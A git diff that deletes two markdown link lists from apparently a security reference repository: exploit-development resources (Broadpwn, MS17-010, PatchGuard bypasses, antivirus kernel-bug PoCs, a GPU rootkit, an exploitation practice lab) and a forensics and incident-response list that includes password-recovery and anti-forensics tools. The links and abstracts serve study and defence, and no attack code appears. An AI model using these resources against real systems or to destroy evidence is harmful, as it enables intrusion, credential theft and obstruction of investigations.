-* [The Chakra Exploit and the Limitations of Modern Mitigation Techniques](https://www.endgame.com/blog/chakra-exploit-and-limitations-modern-mitigation-techniques)
-* [EnglishmansDentist Exploit Analysis](https://blogs.technet.microsoft.com/srd/2017/07/20/englishmansdentist-exploit-analysis/)
-* [Dangerous Clipboard: Analysis of the MS15-072 Patch](http://blog.talosintel.com/2015/10/dangerous-clipboard.html?m=1)
-* [MS16-039 - "Windows 10" 64 bits Integer Overflow exploitation by using GDI objects](https://www.coresecurity.com/blog/ms16-039-windows-10-64-bits-integer-overflow-exploitation-by-using-gdi-objects)
-* [The Weak Bug - Exploiting a Heap Overflow in VMware](http://acez.re/the-weak-bug-exploiting-a-heap-overflow-in-vmware/)
-* [MS17-010](https://github.com/worawit/MS17-010)
-* [CVE-2016-7255 - Git repo](https://github.com/mwrlabs/CVE-2016-7255)
-* [Hijacking Arbitrary .NET Application Control Flow](https://www.tophertimzen.com/resources/grayStorm/HijackingArbitraryDotnetApplicationControlFlow.pdf)
-	* This paper describes the use of Reflection in .NET and how it can be utilized to change the control flow of an arbitrary application at runtime. A tool, Gray Storm, will be introduced that can be injected into an AppDomain and used to control the executing assembly instructions after just-in-time compilation.
-* [Dissecting Veil-Evasion Powershell Payloads and Converting to a Bind Shell](http://threat.tevora.com/dissecting-veil-evasion-powershell-payloads-and-converting-to-a-bind-shell/)
-
-
-
-
-
-##### Broadpwn
-* [A cursory analysis of @nitayart's Broadpwn bug (CVE-2017-9417)](http://boosterok.com/blog/broadpwn/)
-* [Emulation and Exploration of BCM WiFi Frame Parsing using LuaQEMU](https://comsecuris.com/blog/posts/luaqemu_bcm_wifi/)
-* [Broadpwn: Remotely Compromising Android and iOS via a Bug in Broadcom’s Wi-Fi Chipsets](https://blog.exodusintel.com/2017/07/26/broadpwn/)
-* [Crashing phones with Wi-Fi: Exploiting nitayart's Broadpwn bug (CVE-2017-9417)](http://boosterok.com/blog/broadpwn2/)
-
-
-
-
-
-
-
-#### Writeups that are Papers
-* [MALLOC DES-MALEFICARUM - blackngel](http://phrack.org/issues/66/10.html)
-* [Smashing the Heap with Vector: Advanced Exploitation Technique in Recent Flash Zero-day Attack](https://0b3dcaf9-a-62cb3a1a-s-sites.googlegroups.com/site/zerodayresearch/smashing_the_heap_with_vector_Li.pdf)
-* [Exploiting CVE-2014-4113 on Win8.1](http://www.jodeit.org/research/Exploiting_CVE-2014-4113_on_Windows_8.1.pdf) 
-* [The Userland Exploits of Pangu 8](http://blog.pangu.io/wp-content/uploads/2015/03/CanSecWest2015_Final.pdf)
-* [Debugging Windows kernel under VMWare using IDA's GDB debugger](https://cyberview.files.wordpress.com/2010/09/gdb_vmware_winkernel.pdf)
-* [Pandora's Cash Box - The Ghost under your POS - RECON2015](https://recon.cx/2015/slides/recon2015-17-nitay-artenstein-shift-reduce-Pandora-s-Cash-Box-The-Ghost-Under-Your-POS.pdf)
-* [Smashing the Browser](https://github.com/demi6od/Smashing_The_Browser) 
-	* Smashing The Browser: From Vulnerability Discovery To Exploit 
-	* Writeup: going from fuzzing to an IE11 0day exploit development
-* [Pwning Adobe Reader with XFA](http://siberas.de/presentations/SyScan360_2016_-_Pwning_Adobe_Reader_with_XFA.pdf)
-* [Hello MS08-067, My Old Friend!](https://labs.mwrinfosecurity.com/assets/BlogFiles/hello-ms08-067-my-old-friend.pdf)
-* [EXPLOITING  BUFFER  OVERFLOWS ON  MIPS ARCHITECTURE](https://www.exploit-db.com/docs/39658.pdf)
-* [The Birth of a Complete IE11 Exploit Under the New Exploit Mitigations](https://www.syscan.org/index.php/download/get/aef11ba81927bf9aa02530bab85e303a/SyScan15%20Yuki%20Chen%20-%20The%20Birth%20of%20a%20Complete%20IE11%20Exploit%20Under%20the%20New%20Exploit%20Mitigations.pdf)
-* [Modern Objective-C Exploitation Techniques](http://www.phrack.com/papers/modern_objc_exploitation.html)
-* [A New CVE-2015-0057 Exploit Technology](https://www.exploit-db.com/docs/39660.pdf)
-* [PLASMA PULSAR](https://github.com/stealth/plasmapulsar/blob/master/README.md)
-	* This document describes a generic root exploit against kde.
-* [Exploiting Memory Corruption Vulnerabilities in the Java Runtime](https://media.blackhat.com/bh-ad-11/Drake/bh-ad-11-Drake-Exploiting_Java_Memory_Corruption-WP.pdf)
-* [Fun with info leaks](https://rh0dev.github.io/blog/2015/fun-with-info-leaks/)
-* [PatchGuard Reloaded: A Brief Analysis of PatchGuard Version 3](http://uninformed.org/?v=all&a=38&t=sumry)
-	* Since the publication of previous bypass or circumvention techniques for Kernel Patch Protection (otherwise known as "PatchGuard"), Microsoft has continued to refine their patch protection system in an attempt to foil known bypass mechanisms. With the release of Windows Server 2008 Beta 3, and later a full-blown distribution of PatchGuard to Windows Vista and Windows Server 2003 via Windows Update, Microsoft has introduced the next generation of PatchGuard to the general public ("PatchGuard 3"). As with previous updates to PatchGuard, version three represents a set of incremental changes that are designed to address perceived weaknesses and known bypass vectors in earlier versions. Additionally, PatchGuard 3 expands the set of kernel variables that are protected from unauthorized modification, eliminating several mechanisms that might be used to circumvent PatchGuard while co-existing (as opposed to disabling) it. This article describes some of the changes that have been made in PatchGuard 3. This article also proposes several new techniques that can be used to circumvent PatchGuard's defenses. Countermeasures for these techniques are also discussed.
-* [Subverting PatchGuard Version 2](http://uninformed.org/?v=all&a=28&t=sumry)
-	* Windows Vista x64 and recently hotfixed versions of the Windows Server 2003 x64 kernel contain an updated version of Microsoft's kernel-mode patch prevention technology known as PatchGuard. This new version of PatchGuard improves on the previous version in several ways, primarily dealing with attempts to increase the difficulty of bypassing PatchGuard from the perspective of an independent software vendor (ISV) deploying a driver that patches the kernel. The feature-set of PatchGuard version 2 is otherwise quite similar to PatchGuard version 1; the SSDT, IDT/GDT, various MSRs, and several kernel global function pointer variables (as well as kernel code) are guarded against unauthorized modification. This paper proposes several methods that can be used to bypass PatchGuard version 2 completely. Potential solutions to these bypass techniques are also suggested. Additionally, this paper describes a mechanism by which PatchGuard version 2 can be subverted to run custom code in place of PatchGuard's system integrity checking code, all while leaving no traces of any kernel patching or custom kernel drivers loaded in the system after PatchGuard has been subverted. This is particularly interesting from the perspective of using PatchGuard's defenses to hide kernel mode code, a goal that is (in many respects) completely contrary to what PatchGuard is designed to do. 
-* [Bypassing PatchGuard on Windows x64](http://uninformed.org/?v=all&a=14&t=sumry)
-	* The version of the Windows kernel that runs on the x64 platform has introduced a new feature, nicknamed PatchGuard, that is intended to prevent both malicious software and third-party vendors from modifying certain critical operating system structures. These structures include things like specific system images, the SSDT, the IDT, the GDT, and certain critical processor MSRs. This feature is intended to ensure kernel stability by preventing uncondoned behavior, such as hooking. However, it also has the side effect of preventing legitimate products from working properly. For that reason, this paper will serve as an in-depth analysis of PatchGuard's inner workings with an eye toward techniques that can be used to bypass it. Possible solutions will also be proposed for the bypass techniques that are suggested.
-
-
-
-
-----------------
-### <a name="attackingav"></a>Attacking AntiVirus
-* [Kaspersky Hooking Engine Analysis](https://quequero.org/2014/10/kaspersky-hooking-engine-analysis/)
-* [AV_Kernel_Vulns](https://github.com/bee13oy/AV_Kernel_Vulns)
-* Pocs for Antivirus Software‘s Kernel Vulnerabilities
-
-
-
-
-----------------
-### <a name="bughunt">Finding Vulnerabilities</a>
-* Look at fuzzing section.
-* [Winmerge](http://winmerge.org/)
-	* WinMerge is an Open Source differencing and merging tool for Windows. WinMerge can compare both folders and files, presenting differences in a visual text format that is easy to understand and handle.
-* [Analyzing Common Binary Parser Mistakes](http://uninformed.org/?v=all&a=12&t=sumry)
-	* With just about one file format bug being consistently released on a weekly basis over the past six to twelve months, one can only hope developers would look and learn. The reality of it all is unfortunate; no one cares enough. These bugs have been around for some time now, but have only recently gained media attention due to the large number of vulnerabilities being released. Researchers have been finding more elaborate and passive attack vectors for these bugs, some of which can even leverage a remote compromise. 
-
-#### Finding and analyzing Crash dumps
-* [All the Ways to Capture a Crash Dump](http://blogs.msdn.com/b/pfedev/archive/2008/09/26/all-the-ways-to-capture-a-dump.aspx)
-* [Basic Debugging of an Application Crash](http://blogs.technet.com/b/askperf/archive/2007/05/29/basic-debugging-of-an-application-crash.aspx)
-* [Collecting User Mode Dumps](https://msdn.microsoft.com/en-us/library/windows/desktop/bb787181(v=vs.85).aspx)
-
-
-
-#### High Level Searching
-##### Searching Github for vulnerable code/credentials
-* [Blogpost](http://blog.conviso.com.br/2013/06/github-hacking-for-fun-and-sensitive.html)
-* [Code - Automated Tool](https://github.com/convisoappsec/research_github_hack/blob/master/github_hack.pl)
-* [Cheatsheet](https://github.com/search#search_cheatsheet_pane)
-* [Actual Search Page](https://github.com/search)
-
-### Online Resources
-* [ropshell](http://ropshell.com/)
-	* ropshell is a free online service for generating and searching for Return-Oriented-Programming (ROP) gadgets.fi8ter8
-
-
-
-
-
-----------------
-### <a name="collection"></a>Exploit Collections
-* [XiphosResearch PoC Exploits](https://github.com/XiphosResearch/exploits)
-	* Miscellaneous proof of concept exploit code written at Xiphos Research for testing purposes.
-* [exploit-db.org](https://www.exploit-db.org)
-
-
-
-
-
-----------------
-### <a name="antidev"></a>Anti-Exploit Development
-* [BuBBle: A Javascript Engine Level Countermeasure against Heap-Spraying Attacks](http://cd80.ca/files/bubble.pdf)
-	* Abstract. Web browsers that support a safe language such as Javascript are becoming a platform of great interest for security attacks. One such attack is a heap-spraying attack: a new kind of attack that combines the notoriously hard to reliably exploit heap-based buffer overflow with the use of an in-browser script- ing language for improved r eliability. A typical heap-s praying attack allocates a high number of objects containing the attacker’s code on the heap, dramatically increasing the probability that the contents of one of these objects is executed. In this paper we present a lightweight approach that makes heap-spraying attacks in Javascript significantly harder. Our prototype, which is implemented in Firefox, has a negligible performance and memory overhead while effectively protecting against heap-spraying attacks.
-
-
-----------------
-### <a name="gpu"></a>GPU Exploits / Research
-* [A Study of Overflow Vulnerabilities on GPUs](https://www.aimlab.org/haochen/papers/npc16-overflow.pdf)
-* [Jellyfish - GPU rootkit PoC by Team Jellyfish ](https://github.com/x0r1/jellyfish)
-	* Jellyfish is a Linux based userland gpu rootkit proof of concept project utilizing the LD_PRELOAD technique from Jynx (CPU), as well as the OpenCL API developed by Khronos group (GPU). Code currently supports AMD and NVIDIA graphics cards. However, the AMDAPPSDK does support Intel as well. 
-
-
-
-
-
-
-
-
-
-
-
-
--------------
-### <a name="practice"></a>Exploit Development Practice Lab Setup
-
-
-`````
-Building a Lab to practice Exploit writing
-
-
-
-So, this is a thing I found while doing some googling. If you wrote this, I owe you a lot of beer. I redacted the place/username as it was on a less than happy place.
-|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
-This assumes you have an idea of ASM x86 and general exploitation methods.
-
-Idea with this setup, is that you have a VM of XP SP3 running with the following software and tools installed. You look up the exploits on exploit-db and recreate them. Or you lookup the vulnerabilities and fuzz it yourself knowing where to look.
-
- 
-Start here:
-I'm designing exploit lab based on WinXP SP3. As for now I have following vulnerabilities/apps:
-
-1. Simple RET - Ability FTP Server (FTP)
-2. Simple RET - FreeFloat FTP (FTP)
-3. Simple RET (harder) - CesarFTP (FTP)
-4. Simple RET - Easy RM to MP3 Converter (.pls)
-5. Simple RET - DL-10 - Need to find copy of
-6. SEH - DVDXPlayer
-7. SEH - Millenium
-8. SEH - Soritong
-9. SEH - mp3nator
-10. SEH - NNM (hard) - Need to find copy of
-11. SEH + UNICODE - ALLPlayer
-12. SEH (difficult) - Winamp
-
-with following tools installed:
-
-1. WinDBG + MSEC.dll (!load winext\msec.dll) + byakugan (!load byakugan)
-2. Immunity Debugger + mona.py (!mona)
-3. OllyDBG+Plugins(SSEH+OllySnake+AdvancedOlly+OllyHeapVis+Virtual2Physical)
-4. C:\Windows\system32\findjmp2.exe
-5. Cygwin + perl + gdb + gcc...
-6. Python26 (for IDA) + PyDbg - https://code.google.com/p/pydbgr/wiki/HowToInstall
-6. Python27 (for ImmunityDebugger)+pyDbg
-7. lcc-win
-8. Wireshark
-9. Mantra on Chrome (MoC)
-10. Google-Chrome
-11. Microsoft Visual C++ 2008 Express
-12. Nasm
-13. metasploit
-14. Alpha3 (c:\Alpha3)
-15. IDA
-16. Sysinternals (c:\Windows\System32)
-17. Proxifier Edition
-18. Echo Mirage
-
-`````
diff --git a/Draft/Forensics Incident Response.md b/Draft/Forensics Incident Response.md
deleted file mode 100755
index b8bd530..0000000
--- a/Draft/Forensics Incident Response.md	
+++ /dev/null
@@ -1,377 +0,0 @@
-##Forensics & Incident Response
-
-
-#####TOC
-* General
-* Tools
-* [Presentations/Talks](#talks)
-* [Anti-Forensics](#anti)
-* [Mobile Device Forensics](#mobile)
-	* [Android](#android)
-	* [iOS](#ios)
-	* [Blackberry](#bb)
-[PDF Forensics](#pdf)
-[Photo Forensics](#photo)
-[Tools](#tools)
-[OS Forensics](#os)
-	* [Linux Forensics](#linux)
-	* [OS X Forensics](#osx)
-	* [Windows Forensics](#windows)
-
-
-
-#### CULL
-https://forensiccontrol.com/resources/free-software/
-Forensics wiki
-* [dotNET_WinDBG](https://github.com/Cisco-Talos/dotNET_WinDBG)
-	* This python script is designed to automate .NET analysis with WinDBG. It can be used to analyse a PowerShell script or to unpack a binary packed using a .NET packer.
-
-[Unravelling .NET with the Help of WinDBG - TALOS](http://blog.talosintelligence.com/2017/07/unravelling-net-with-help-of-windbg.html)
-* This article describes:
-  * How to analyse PowerShell scripts by inserting a breakpoint in the .NET API.
-  * How to easily create a script to automatically unpack .NET samples following analysis of the packer logic.
-#### End Cull
-
-
-
-
-
-
-
-
-
---------------
-#### Sniper Forensics
-http://windowsir.blogspot.com/2013/11/sniper-forensics-memory-analysis-and.html
-* [Malware Management Framework - Sniper Forensics Toolkit](http://sniperforensicstoolkit.squarespace.com/malwaremanagementframework/)
-* [The Malware Management Framework](https://malwarearchaeology.squarespace.com/mmf/)
-	* The Malware Reporting Standard](https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/55220280e4b0170ec8b526b6/1428292224531/Malware+Reporting+Standard+vApril+2015.pdf)
-	* [BSidesLV Presentation](https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/552200afe4b0e4ad5008b943/1428291802554/Malware+Mgmt+Framework+v2.0.pdf)
-* [Sniper Forensics](https://digital-forensics.sans.org/summit-archives/2010/2-newell-spiderlabs-sniper-forensics.pdf)
-	* Pg10 and onward
-	* [Link](https://sniperforensicstoolkit.squarespace.com/storage/logging/Windows%20Logging%20Cheat%20Sheet%20v1.1.pdf)
-
-
-
-
------------
-### <a name="general"></a>General
-* Better security -> Mean time to detect/Mean time to respond
-* [IRM (Incident Response Methodologies)](https://github.com/certsocietegenerale/IRM)
-	* CERT Societe Generale provides easy to use operational incident best practices. These cheat sheets are dedicated to incident handling and cover multiple fields in which a CERT team can be involved. One IRM exists for each security incident we're used to dealing with.
-* [Introduction to DFIR](https://sroberts.github.io/2016/01/11/introduction-to-dfir-the-beginning/)
-* [File Signature Table](http://www.garykessler.net/library/file_sigs.html)
-	* This table of file signatures (aka "magic numbers") is a continuing work-in-progress. I have found little information on this in a single place, with the exception of the table in Forensic Computing: A Practitioner's Guide by T. Sammes & B. Jenkinson (Springer, 2000); that was my inspiration to start this list in 2002. See also Wikipedia's List of file signatures. Comments, additions, and queries can be sent to Gary Kessler at gck@garykessler.net.
-* [IRMA - Incident Response & Malware Analysis](http://irma.quarkslab.com/index.html)
-	* IRMA intends to be an open-source platform designed to help identifying and analyzing malicious files.  However, today's defense is not only about learning about a file, but it is also getting a fine overview of the incident you dealt with: where / when a malicious file has been seen, who submitted a hash, where a hash has been noticed, which anti-virus detects it, ...  An important value with IRMA comes from you keep control over where goes / who gets your data. Once you install IRMA on your network, your data stays on your network.  Each submitted files is analyzed in various ways. For now, we focus our efforts on multiple anti-virus engines, but we are working on other "probes" (feel free to submit your own).
-* [No Easy Breach: Challenges and Lessons Learned from an Epic Investigation](https://archive.org/details/No_Easy_Breach#)
-* [Forensics on Amazon’s EC2](https://sysforensics.org/2014/10/forensics-in-the-amazon-cloud-ec2.html)
-* [Attrition Forensics](http://2014.video.sector.ca/video/110334184)
-* [Less is More, Exploring Code/Process-less Techniques and Other Weird Machine Methods to Hide Code (and How to Detect Them)](https://cansecwest.com/slides/2014/less%20is%20more3.pptx)
-
-
-
---------------
-### <a name="writeups"></a>Writeups
-* [Handler Diaries - Another Hunting Post(DFIR)](http://blog.handlerdiaries.com/?p=775)
-	* Good post on not only knowing the layout, but knowing expected behaviours.
-* [Automating DFIR - How to series on programming libtsk with python Part 3](http://www.hecfblog.com/2015/02/automating-dfir-how-to-series-on_21.html)
-* [Happy DPAPI!](http://blog.digital-forensics.it/2015/01/happy-dpapi.html)
-
-
------------
-#### Hacking Exposed - Automating DFIR Series
-* [Automating DFIR - How to series on programming libtsk with python Part 1 - ](http://hackingexposedcomputerforensicsblog.blogspot.com/2015/02/automating-dfir-how-to-series-on.html)
-* [Automating DFIR - How to series on programming libtsk with python Part 2](http://hackingexposedcomputerforensicsblog.blogspot.com/2015/02/automating-dfir-how-to-series-on_19.html)
-[Automating DFIR - How to series on programming libtsk with python Part 3](http://
-* [THE CIDER PRESS:EXTRACTING FORENSIC ARTIFACTS FROM APPLE CONTINUITY](https://www.sans.org/summit-archives/file/summit-archive-1498146226.pdf)
-
-
-
-
-
-
-### <a name="tools"></a>Tools
-* [MIG: Mozilla InvestiGator](https://http://mig.mozilla.org/)
-	* Mozilla's real-time digital forensics and investigation platform.
-* [SSDeep](http://ssdeep.sourceforge.net/)
-	* ssdeep is a program for computing context triggered piecewise hashes (CTPH). Also called fuzzy hashes, CTPH can match inputs that have homologies. Such inputs have sequences of identical bytes in the same order, although bytes in between these sequences may be different in both content and length. 
-* [binwally](https://github.com/bmaia/binwally)
-	* Binary and Directory tree comparison tool using the Fuzzy Hashing concept (ssdeep)
-* [PDF Tools - Didier Stevens](http://blog.didierstevens.com/programs/pdf-tools/)
-* [Xmount](https://www.pinguin.lu/xmount)
-	* What is xmount? xmount allows you to convert on-the-fly between multiple input and output harddisk image types. xmount creates a virtual file system using FUSE (Filesystem in Userspace) that contains a virtual representation of the input image. The virtual representation can be in raw DD, DMG, VHD, VirtualBox's virtual disk file format or in VmWare's VMDK file format. Input images can be raw DD, EWF (Expert Witness Compression Format) or AFF (Advanced Forensic Format) files. In addition, xmount also supports virtual write access to the output files that is redirected to a cache file. This makes it possible to boot acquired harddisk images using QEMU, KVM, VirtualBox, VmWare or alike.
-* [Extensible Metadata Platform](https://en.wikipedia.org/wiki/Extensible_Metadata_Platform)
-	* The Extensible Metadata Platform (XMP) is an ISO standard, originally created by Adobe Systems Inc., for the creation, processing and interchange of standardized and custom metadata for digital documents and data sets.
-* [PEview](http://wjradburn.com/software/)
-	* PEview provides a quick and easy way to view the structure and content of 32-bit Portable Executable (PE) and Component Object File Format (COFF) files. This PE/COFF file viewer displays header, section, directory, import table, export table, and resource information within EXE, DLL, OBJ, LIB, DBG, and other file types.
-* [firepwd.py](https://github.com/lclevy/firepwd)
-	* firepwd.py, an open source tool to decrypt Mozilla protected passwords
-* [osxcollector](https://github.com/Yelp/osxcollector)
-	* OSXCollector is a forensic evidence collection & analysis toolkit for OSX.
-[Jeffrey's Image Metadata Viewer](http://exif.regex.info/exif.cgi)
-
-
---------------
-### <a name="firmware"></a>Firmware 
-* [Firmware Forensics: Diffs, Timelines, ELFs and Backdoors](http://w00tsec.blogspot.com/2015/02/firmware-forensics-diffs-timelines-elfs.html)
-
-
-
-
-
-
---------------
-### <a name="bitlocker"></a>Bitlocker
-* [NVbit : Accessing Bitlocker volumes from linux](http://www.nvlabs.in/index.php?/archives/1-NVbit-Accessing-Bitlocker-volumes-from-linux.html)
-
-
-
-
---------------
-### <a name="ir"></a>IR
-* [Rapier](https://code.google.com/p/rapier/)
-	* RAPIER is a security tool built to facilitate first response procedures for incident handling. It is designed to acquire commonly requested information and samples during an information security event, incident, or investigation. RAPIER automates the entire process of data collection and delivers the results directly to the hands of a skilled security analyst 
-* [triage-ir](https://code.google.com/p/triage-ir/)
-	* Triage: Incident Response automatically collect information from a system that needs basic triage functions performed upon it. The script allows for easy modification for customization to your needs, in an easy to comprehend and implement language. This tool uses a lot others to get its information. Eventually I hope to eliminate the need for them, but use them as verification. This tool requires you to download the Sysinternals Suite if you want full functionality to it.
-* [Fully Integrated Defense Operation (FIDO)](https://github.com/Netflix/Fido)
-	* FIDO is an orchestration layer used to automate the incident response process by evaluating, assessing and responding to malware. FIDO’s primary purpose is to handle the heavy manual effort needed to evaluate threats coming from today's security stack and the large number of alerts generated by them. As an orchestration platform FIDO can make using your existing security tools more efficient and accurate by heavily reducing the manual effort needed to detect, notify and respond to attacks against a network.
-* [Triaging Malware Incidents](http://journeyintoir.blogspot.com/2013/09/triaging-malware-incidents.html)
-	* Good writeup/blogpost from Journey into Incidence Response
-* [Computer Security Incident Handling Guide - NIST](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)
-* [An Incident Handling Process for Small and Medium Businesses  - SANS 2007](https://www.sans.org/reading-room/whitepapers/incident/incident-handling-process-small-medium-businesses-1791)
-* [PowerForensics - PowerShell Digital Forensics](https://github.com/Invoke-IR/PowerForensics)
-	* The purpose of PowerForensics is to provide an all inclusive framework for hard drive forensic analysis. PowerForensics currently supports NTFS and FAT file systems, and work has begun on Extended File System and HFS+ support.
-* [Invoke-IR](http://www.invoke-ir.com/)
-* [Practical Comprehensive Bounds on Surreptitious Communication Over DNS](http://www.icir.org/vern/papers/covert-dns-usec13.pdf)
-
-
-
-
---------------
-### <a name="ioc"></a>IOC
-* [IOC Bucket](https://www.iocbucket.com/)
-	* IOC sharing platform
-
-
-
-
---------------
-### <a name="browser"></a>Browser Forensics
-* [Firefox private browsing forensics](http://www.magnetforensics.com/forensic-implications-of-a-person-using-firefoxs-private-browsing/)
-* [MozillaRecovery](https://github.com/gtfy/MozillaRecovery)
-	* Recovers the master password of key3.db files, i.e. Thunderbird, Firefox
-* [Google Chrome Forensics-SANS](https://digital-forensics.sans.org/blog/2010/01/21/google-chrome-forensics#)
-* [Extension Finder](https://github.com/brad-anton/extension_finder)
-	* Python and PowerShell utilities for finding installed browser extensions, plug-ins and add-ons. Attempts to find installed browser extensions (sometimes called add-ons or plug-ins, depending on the browser).
-* [MozillaRecovery](https://github.com/gtfy/MozillaRecovery)
-	* Recovers the master password of key3.db files, i.e. Thunderbird, Firefox
-
-
-
---------------
-### <a name="memory"></a>Memory Forensics
-* [Detekt](https://github.com/botherder/detekt)
-	* Detekt is a Python tool that relies on Yara, Volatility and Winpmem to scan the memory of a running Windows system (currently supporting Windows XP to Windows 8 both 32 and 64 bit and Windows 8.1 32bit). Detekt tries to detect the presence of pre-defined patterns that have been identified through the course of our research to be unique identifiers that indicate the presence of a given malware running on the computer. 
-* [Dshell](https://github.com/USArmyResearchLab/Dshell)
-	* An extensible network forensic analysis framework. Enables rapid development of plugins to support the dissection of network packet captures. 
-* [Mem forenics cheat sheet](http://forensicmethods.com/wp-content/uploads/2012/04/Memory-Forensics-Cheat-Sheet-v1.pdf)
-* [LiME - Linux Memory Extractor](https://github.com/504ensicsLabs/LiME)
-	* A Loadable Kernel Module (LKM) which allows for volatile memory acquisition from Linux and Linux-based devices, such as Android. This makes LiME unique as it is the first tool that allows for full memory captures on Android devices. It also minimizes its interaction between user and kernel space processes during acquisition, which allows it to produce memory captures that are more forensically sound than those of other tools designed for Linux memory acquisition.
-* [Volatility](https://github.com/volatilityfoundation/volatility)
-	* An advanced memory forensics framework
-* [evolve](https://github.com/JamesHabben/evolve)
-	* Web interface for the Volatility Memory Forensics Framework 
-* [How to Pull passwords from a memory dump](https://cyberarms.wordpress.com/2011/11/04/memory-forensics-how-to-pull-passwords-from-a-memory-dump/)
-* [Unmasking Careto through Memory Analysis - Andrew Case](http://2014.video.sector.ca/video/110388398)
-* [Windows Memory Analysis Checklist](http://www.dumpanalysis.org/windows-memory-analysis-checklist)
-
-
-
-
-
-
---------------
-### <a name="training"></a>Training material
-* [ENISA CERT Exercises and Training](http://www.enisa.europa.eu/activities/cert/support/exercise)
-	* ENISA CERT Exercises and training material was introduced in 2008, in 2012 and 2013 it was complemented with new exercise scenarios containing essential material for success in the CERT community and in the field of information security. In this page you will find the ENISA CERT Exercise material, containing Handbook for teachers, Toolset for students and Virtual Image to support hands on training sessions. 
-* [Packet Capture Examples from "Practical Packet Analysis"](http://www.chrissanders.org/captures/)
-
-
-
---------------
-### <a name="talks">Presentations & Talks</a>
-* [Forensic Imager Tools: You don't have the Evidence - Shmoocon 2014](https://www.youtube.com/watch?v=zYYCv21I-1I)*
-* [Ways to Identify Malware on a System Ryan Irving](http://www.irongeek.com/i.php?page=videos/bsidestampa2015/201-ways-to-identify-malware-on-a-system-ryan-irving)
-* [Investigating PowerShell Attacks - Ryan Kazanciyan and Matt Hastings - DEFCON22](https://www.youtube.com/watch?v=qF06PFcezLs)
-	* This presentation will focus on common attack patterns performed through PowerShell - such as lateral movement, remote command execution, reconnaissance, file transfer, etc. - and the sources of evidence they leave behind. We'll demonstrate how to collect and interpret these forensic artifacts, both on individual hosts and at scale across the enterprise. Throughout the presentation, we'll include examples from real-world incidents and recommendations on how to limit exposure to these attacks.
-* [Human Hunting](http://www.irongeek.com/i.php?page=videos/bsidessf2015/108-human-hunting-sean-gillespie) 
-	* Much of what appears to be happening in information security seems to be focused on replacing humans with magic boxes and automation rather than providing tools to augment human capabilities. However, when we look at good physical security we see technology is being used to augment human capabilities rather than simply replace them. The adversary is human so we are ultimately looking for human directed behaviors. If analysts don't know how to go looking for evil without automated detection tools then they are not going to be able to effectively evaluate if the detection tools are working properly or if the deployment was properly engineered. An over reliance on automated detection also puts organizations in a position of paying protection money if they want to remain secure. We should be spending more resources on honing analyst hunting skills to find human adversaries rather than purchasing more automated defenses for human adversaries to bypass.
-* [Finding Bad Guys with 35 million Flows, 2 Analysts, 5 Minutes and 0 Dollars](http://www.irongeek.com/i.php?page=videos/bsidesknoxville2015/103-finding-bad-guys-with-35-million-flows-2-analysts-5-minutes-and-0-dollars-russell-butturini)
-	* There are a lot of proof of concepts out there for building open source networks forensics analysis environments. Taking them into production in an enterprise? Another story entirely. This talk will focus on my journey into constructing a large scale Netflow security analytics platform for a large healthcare management company's complex environment on no additional budget. Important points to be covered were technology considerations, scalability, and how to quickly break the collected data down to find malicious activity on the network with minimal effort.
-* [Fraud detection and forensics on telco networks - Hack.lu 2016](https://www.youtube.com/watch?v=09EAWT_F1ZA&app=desktop)
-* [Commercial Spyware - Detecting the Undetectable](https://www.blackhat.com/docs/us-15/materials/us-15-Dalman-Commercial-Spyware-Detecting-The-Undetectable-wp.pdf)
-
-
---------------
-### <a name="anti">Anti-Forensics</a>
-* [Destroying Evidence Before Its Evidence](https://www.youtube.com/watch?v=lqBVAcxpwio&spfreload=1)
-* [And That's How I Lost My Other Eye...Explorations in Data Destruction](https://www.youtube.com/watch?v=-bpX8YvNg6Y)
-* [Secure Deletion of Data from Magnetic and Solid-State Memory](http://static.usenix.org/publications/library/proceedings/sec96/full_papers/gutmann/index.html)
-* [usbkill](https://github.com/stemid/usbkill)
-	* A tool that shuts down your computer if USB devices change, for example if you unplug or plug-in a device. 
-* [An Anti-Forensics Primer - Jason Andress](http://www.irongeek.com/i.php?page=videos/derbycon3/s216-an-anti-forensics-primer-jason-andress)
-	* This talk will cover the basics of anti-forensics, the tools and techniques that can be used to make life harder for computer forensic examiners. We will cover some of the basic methods that are used (disk wiping, time stomping, encryption, etc…) and talk about which of these methods might actually work and which are easily surmounted with common forensic tools.
-* [OpenPuff Steganography](http://embeddedsw.net/OpenPuff_Steganography_Home.html)
-* [Forensics Impossible: Self-Destructing Thumb Drives - Brandon Wilson](https://www.youtube.com/watch?v=NRMqwc5YEu4)
-* [CleanAfterMe](https://www.nirsoft.net/utils/clean_after_me.html )
-	* CleanAfterMe allows you to easily clean files and Registry entries that are automatically created by the Windows operating system during your regular computer work. With CleanAfterMe, you can clean the cookies/history/cache/passwords of Internet Explorer, the 'Recent' folder, the Registry entries that record the last opened files, the temporary folder of Windows, the event logs, the Recycle Bin, and more.| http://
-* [Hiding Data in Hard-Drive's Service Areas](http://recover.co.il/SA-cover/SA-cover.pdf)
-	* In this paper we will demonstrate how spinning hard-drives’ serv ice areas 1 can be used to hide data from the operating-system (or any software using the standard OS’s API or the standard ATA commands to access the hard- drive)
-* [Anti-Forensics and Anti-Anti-Forensics Attacks - Michael Perkins](https://www.youtube.com/watch?v=J4x8Hz6_hq0)
-	* Everyone's heard the claim: Security through obscurity is no security at all. Challenging this claim is the entire field of steganography itself - the art of hiding things in plain sight. Most people know you can hide a text file inside a photograph, or embed a photograph inside an MP3. But how does this work under the hood? What's new in the stego field?  This talk will explore how various techniques employed by older steganographic tools work and will discuss a new technique developed by the speaker which embodies both data hiding and data enciphering properties by encoding data inside NTFS volumes. A new tool will be released during this talk that will allow attendees to both encode and decode data with this new scheme.
-	* Slides: [Slides(link)](http://www.slideshare.net/the_netlocksmith/defcon-20-antiforensics-and-antiantiforensics)
-* [Beyond The CPU:Defeating Hardware Based RAM Acquisition](https://www.blackhat.com/presentations/bh-dc-07/Rutkowska/Presentation/bh-dc-07-Rutkowska-up.pdf)
-* [Hardware Backdooring is Practical** -Jonathan Brossard](https://www.youtube.com/watch?v=umBruM-wFUw)
-* [Hiding the breadcrumbs: Forensics and anti-forensics on SAP systems - Juan Perez-Etchegoyen](http://www.irongeek.com/i.php?page=videos/derbycon4/t508-hiding-the-breadcrumbs-forensics-and-anti-forensics-on-sap-systems-juan-perez-etchegoyen)
